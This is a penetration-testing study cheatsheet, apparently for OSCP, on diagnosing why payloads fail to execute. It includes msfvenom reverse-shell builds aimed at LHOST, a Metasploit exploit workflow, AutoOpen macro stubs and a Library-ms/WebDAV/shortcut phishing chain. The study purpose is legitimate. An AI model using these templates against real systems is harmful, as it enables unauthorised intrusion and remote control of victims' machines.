Payload Execution Obstacles Cheatsheet

← Cheatsheet index | Full procedure | Shells and payloads | Pivoting | Strategy map | Study methods: Resolve payload execution obstacles

State ladder

delivery → trigger → parser/loader → execution → connection → handler → session

Preserve the last confirmed state. Change only the next failed boundary.

EvidenceNext question
File/request arrivedDid the intended consumer open/parse it?
User/service triggered itDid a harmless command execute?
Marker/process existsCan that context reach the listener?
TCP connection arrivedDoes the handler match the payload?
Session openedWhat host, identity, architecture and privilege?

First-pass triage

  1. Prove a harmless direct command.
  2. Verify final artifact path and hash.
  3. Write every parser/interpreter/loader.
  4. Match OS, process bitness, format and dependencies.
  5. Check permissions, working directory and explicit policy/control evidence.
  6. Verify listener bind and target-to-listener route.
  7. Match staged/stageless payload and handler.
  8. Repair session I/O last.

Office macro gates

Use .docm or legacy .doc; .docx alone does not persist embedded VBA. Store the macro in the document.

Harmless trigger proof:

Sub AutoOpen()
    RunProof
End Sub

Sub Document_Open()
    RunProof
End Sub

Sub RunProof()
    CreateObject("WScript.Shell").Run _
        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
End Sub

Zone inspection:

Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier

Check in order:

format → macro saved in document → MOTW/zone → Protected View/Trust/GPO
→ required user action → Office child process → command parsing → network path

Internet-sourced macros are commonly blocked by default. “Enable Content” is not a universal current path.

Windows Library file chain

.Library-ms → Explorer/WebDAV → .lnk → command → optional download → callback

WsgiDAV, when already installed:

mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous

Port 80 is the plain-HTTP Windows WebDAV baseline. An alternate port needs target-side WebClient and route validation.

Minimal library definition:

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation><url>http://LHOST/</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

Controlled shortcut creation:

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut('C:\PATH\webdav\ACTION.lnk')
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()

Empty libraryWebDAV bind/route/WebClient/policy/serialized state
No WebDAV requestUser action, URL, route or blocked DAV
Directory visible; no commandSecond user action or shortcut control
Marker exists; no downloadQuoting, DNS or delivery-server route
Download exists; no callbackFormat/control/handler/return route

Match the consumer:

direct process → compatible PE/script/runtime
service        → service-aware program or expected 1053 behavior
DLL            → process bitness + exports + dependencies
MSI            → real MSI package
PowerShell     → edition/syntax + policy/control state
existing PoC   → documented space/bad chars/exit behavior

PowerShell quoting

$command = 'COMMAND'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE

UTF-16LE Base64 solves a transport/quoting problem. It is not encryption or an AV bypass.

This does not disable AMSI, Defender, AppLocker/WDAC, permissions or GPO.

msfvenom

msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options

msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
file shell.elf shell.exe
sha256sum shell.elf shell.exe

Existing-PoC constraints only:

msfvenom -p PAYLOAD_NAME LHOST=LHOST LPORT=LPORT \
  EXITFUNC=thread -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' -s MAX_SPACE

shell_reverse_tcp = stageless/single
shell/reverse_tcp = staged; exact framework handler required

Encoders address representation/bad-character needs; they do not guarantee AV evasion.

Restricted Metasploit module workflow

search type:exploit cve:CVE_ID
info MODULE_PATH
use MODULE_PATH
show options
show advanced
show targets
show payloads
set RHOSTS TARGET
set RPORT PORT
set TARGET TARGET_ID
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
show missing
run

Exam boundary:

  • msfvenom and multi/handler are the across-target exceptions, but Meterpreter remains one-target limited.
  • Auxiliary, Exploit or Post modules—or Meterpreter—lock Metasploit to one chosen target even when check or an attempt fails.
  • Metasploit pivoting and automatic exploitation are prohibited.
  • Module rank is stability guidance, not vulnerability proof.

Packet/session interpretation

sudo tcpdump -ni any tcp port LPORT
EvidenceNext action
No SYNRepair execution, LHOST, route or egress
SYN, no replyCorrect listener bind/local firewall
Handshake then closeMatch payload/handler; inspect crash/control
Stable TCP, no commandsCheck staged/raw mismatch and I/O
Session opens then diesParent lifetime, EXITFUNC, crash or control

Handoff

  • Command primitive still unproven → public exploit adaptation.
  • Callback route unproven → pivoting.
  • Session exists but is unusable → shells and payloads.
  • Artifact transfer/integrity problem → file transfer.

Discover and recognize candidates

Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

Resolve payload execution obstacles

Find: Use a gated Office macro delivery chain

From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks.

Get-Item .\FILE -Stream *
Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue

Recognize: Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity.

Validate next: Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution.

Use a gated Office macro delivery chain.

Find: Use a Windows Library/WebDAV/shortcut chain with explicit interaction

Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching.

Get-Content .\FILE.library-ms
Test-NetConnection LHOST -Port PORT

Recognize: The resource can be presented while the executable user interaction is still absent.

Validate next: Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect.

Use a Windows Library/WebDAV/shortcut chain with explicit interaction.

Find: Match an artifact to its executable consumer and runtime

Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors.

file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m

Recognize: An existing file can fail because its loader/runtime is missing; this is separate from callback failure.

Validate next: Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity.

Match an artifact to its executable consumer and runtime.

Find: Repair quoting, encoding and command-length boundaries

Compare the last working simple command with the first added quoting/encoding layer; record which parser receives each representation.

curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH

Recognize: The break follows a shell-language/representation change, so network or exploit applicability need not have changed.

Validate next: Confirm outer decoding, actual inner shell, length and correct byte/string encoding with a small test.

Repair quoting, encoding and command-length boundaries.

Find: Distinguish PowerShell policy, language mode and protected execution layers

Use the failing PowerShell error to inspect execution policy, language mode and actual runtime before choosing an allowed execution form.

Get-ExecutionPolicy -List
$ExecutionContext.SessionState.LanguageMode
$PSVersionTable

Recognize: A script policy gate is distinct from language-mode restrictions or an antimalware verdict.

Validate next: Identify the actual controlling policy and permitted execution path; encoding/policy arguments do not remove unrelated controls.

Distinguish PowerShell policy, language mode and protected execution layers.

Find: Interpret endpoint-control evidence and select a justified alternative

Check artifact persistence/hash and, when permitted, the matching security/policy event before labelling a missing effect as endpoint detection.

Test-Path .\FILE
Get-FileHash .\FILE -Algorithm SHA256 -ErrorAction SilentlyContinue

Recognize: A disappearing artifact narrows the boundary but does not identify a particular control without corroboration.

Validate next: Correlate file/process/event identity, time and exact action before selecting an alternative consumer.

Interpret endpoint-control evidence and select a justified alternative.

Find: Pair staged payloads with the correct handler and session lifecycle

In the selected handler console compare the exact payload/options with the generated artifact and inspect job/session state.

show options
jobs
sessions

Recognize: The first-stage protocol may be reaching a receiver that cannot provide the remaining stage.

Validate next: Verify exact payload/architecture/transport pair, listener bind, stage route and lifecycle.

Pair staged payloads with the correct handler and session lifecycle.

Find: Use a framework module with explicit target and feature constraints

Read the selected module's information/targets/options and compare them with independently gathered component evidence before any target check/run.

info
show options
show targets
show payloads

Recognize: The module describes conditions to investigate; its existence is not a vulnerability result.

Validate next: Verify exact target/configuration, access, payload/route and current feature restrictions before selecting it.

Use a framework module with explicit target and feature constraints.

Find: Diagnose connection direction, listener and session failures in order

Return to the last observed execution proof, inspect listener bind/address and compare actual packet arrival with the expected direction.

ss -lnt
ip route get TARGET
sudo tcpdump -ni INTERFACE tcp port PORT

Recognize: The channel failed before an observed connection; investigate trigger/advertised route/egress before terminal repair.

Validate next: Name the process initiating the connection and its actual destination address/port. Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes.

Diagnose connection direction, listener and session failures in order.
